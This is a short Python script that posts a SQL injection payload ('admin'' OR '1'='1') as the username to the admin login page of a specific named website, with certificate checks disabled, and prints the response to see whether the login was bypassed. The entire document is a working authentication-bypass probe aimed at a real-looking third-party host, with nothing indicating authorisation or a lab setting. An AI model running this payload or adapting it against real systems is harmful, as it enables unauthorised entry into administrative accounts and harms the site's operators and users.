import requests

def test_admin():
    url = "https://iran.fruitcraft.ir/admin/login"
    data = {
        "username": "admin'' OR '1'='1",
        "password": "password"
    }
    r = requests.post(url, data=data, verify=False, allow_redirects=False)
    print("Status:", r.status_code)
    print("Headers:", r.headers)
    print("Body length:", len(r.text))

if __name__ == "__main__":
    test_admin()
